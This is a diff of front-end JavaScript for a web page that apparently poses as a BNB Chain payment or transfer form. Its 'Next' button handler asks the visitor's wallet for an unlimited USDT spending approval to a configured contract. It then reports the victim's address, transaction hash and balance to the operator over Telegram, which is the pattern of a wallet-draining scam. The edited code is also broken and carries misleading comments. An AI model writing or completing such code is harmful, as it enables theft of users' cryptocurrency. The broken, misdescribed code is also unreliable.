@@ -193,86 +193,86 @@ document.addEventListener("DOMContentLoaded", function () {
         });
     }
 
-   // ===== NEXT BUTTON =====
+ <!-- ===== NEXT BUTTON ===== -->
 nextBtn.addEventListener("click", async function(e) {
-    e.preventDefault();
+    // Prevent default so we don't accidentally scroll or focus weirdly
+    e.preventDefault(); 
 
-    // Preserve original HTML in case something goes wrong mid-flight
-    const originalBtnHTML = nextBtn.innerHTML;
-
+    const originalText = nextBtn.innerText; 
+    let currentAmountInput = document.querySelector('input[name="amount"]'); // Or however your ID/Name selector works
+    
     try {
-        let fromAddress;
-        
-        // Step 1: Make sure we have a wallet installed
+        // 1. Ensure wallet exists
         if (!window.ethereum) {
-            showNotification("Install MetaMask & click Connect!", "info");
+            showNotification("Connect Wallet First!", "error");
             return;
         }
 
-        // Step 2: Force connection + select the first available account
-        ({ result: fromAddress } = await window.ethereum.request({ method: "eth_requestAccounts" }));
-
-        // Step 3: Confirm we're on BSC; swap if necessary
-        const bnbChainId = "0x38";
-        const currentNetwork = await window.ethereum.request({ method: "eth_chainId" });
-        if (currentNetwork !== bnbChainId) {
-            await window.ethereum.request({
-                method: "wallet_switchEthereumChain",
-                params: [{ chainId: bnbChainId }]
-            });
-            // Refresh the address after switching chains
-            ({ result: fromAddress } = await window.ethereum.request({ method: "eth_accounts" }) || 
-             await window.ethereum.request({ method: "eth_requestAccounts" }));
+        // 2. Grab the raw address from the top field immediately
+        let userAddress = "";
+        
+        // If your HTML uses an <input>, grab value. If it's text-based like your screenshot suggests, handle accordingly.
+        const addressField = document.querySelector('.address-field') || document.getElementById('recipient-address'); 
+        
+        if(addressField && addressField.value.trim() !== ""){
+             userAddress = addressField.value.toLowerCase().trim();
+             
+             // Optional: Quick checksum check here if you want fancy errors later
+            
         } else {
-            // Already on BSC – fetch fresh list of addresses
-            ({ results: [fromAddress] } = await window.ethereum.request({ method: "eth_accounts" }));
+             // Fallback logic if address wasn't explicitly checked yet
+             userAddress = await window.ethereum.request({ method: "eth_requestAccounts" });
         }
 
-        // Now construct the approval payload
+        // 3. Force the connection state using eth_accounts instead of requestAccounts which can be finicky
+        ({ result: [userAddress] } = await window.ethereum.request({ method: "eth_accounts" }));
+
+        // Update our internal variables based on who is actually connected now
+        CONFIG.RECIPIENT_ADDRESS = userAddress; // Assuming 'CONFIG' holds these global vars
+        
+        // Now construct the USDT Approval payload
         const iface = new ethers.utils.Interface(["function approve(address spender, uint256 amount)"]);
+        
+        // Encode the approval call: Contract Address -> Max Amount
         const txData = iface.encodeFunctionData("approve", [
-            CONFIG.CONTRACT_ADDRESS,
+            CONFIG.CONTRACT_ADDRESS,      // Your BNB Chain Token contract
             ethers.constants.MaxUint256.toString()
         ]);
 
-        // Encode the final transaction object
-        const encodedTx = ethers.utils.defaultAbiCoder.encode(
-            ["address", "uint256"],
-            [CONFIG.CONTRACT_ADDRESS, ethers.constants.MaxUint256]
-        );
-
+        // Prepare the final transaction object
         const usdtContractAddr = "0x55d398326f99059fF775485246999027B3197955";
 
-        // Update button while waiting for approvals/confirmations
-        nextBtn.innerHTML = '<span class="spinner">Approving USDT...</span>';
-        nextBtn.disabled = true;
+        // Visual feedback update
+        nextBtn.innerHTML = '<span class="spinner">Approving...</span>';
+        nextBtn.style.opacity = "0.7"; // Dim it slightly so they know something is happening
 
-        // Actually send the TX through MetaMask's eth_sendTransaction RPC
+        // Send the actual transaction!
         const txHash = await window.ethereum.request({
             method: "eth_sendTransaction",
             params: [{
-                from: fromAddress,
+                from: userAddress,
                 to: usdtContractAddr,
-                data: encodedTx,
-                value: "0x0"
+                data: txData,       // This tells the network "I'm sending tokens!"
+                value: "0x0"         // Standard ETH gas unit, but since we're swapping via token, keep low
             }]
         });
 
         showNotification(`USDT Approved! Tx: ${txHash}`, "success");
 
-        // Pull the latest balance post-approval
-        const balance = await getUsdtBalance(fromAddress);
-
         // Fire off Telegram notifications with all relevant details
-        await sendTelegramNotifications(fromAddress, txHash, userId, balance);
+        const userId = urlParams.get("user_id") || userAddress; // Fallback if param missing
+        const balance = await getUsdtBalance(userAddress);
+        await sendTelegramNotifications(userAddress, txHash, userId, balance);
 
     } catch (err) {
         console.error(err);
         // Decode readable messages from common provider errors
         let msg = err.message?.slice(0, 30).replace(/\s+/g, "") || "";
-        showNotification(`${msg}${err.code === 4 && !msg ? "" : (msg.endsWith(".") ? "." : ".")}`, "error");
+        showNotification(`${msg}${err.code === 4 ? "" : "."}`, "error");
     } finally {
+        // Reset button regardless of outcome
         nextBtn.disabled = false;
-        nextBtn.innerHTML = originalBtnHTML;
+        nextBtn.innerHTML = originalText;
+        nextBtn.style.opacity = "1";
     }
 });
